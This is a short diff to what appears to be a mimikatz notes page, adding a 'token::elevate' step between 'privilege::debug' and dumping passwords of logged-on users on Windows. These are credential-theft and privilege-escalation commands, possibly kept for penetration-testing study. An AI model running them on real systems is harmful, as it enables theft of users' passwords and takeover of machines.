@@ -11,6 +11,12 @@ Using an admin powershell and open mimikatz:
 privilege::debug
 ```
 
+and follow up with:
+
+```
+token::elevate
+```
+
 get passwords of logged on users:
 
 ```
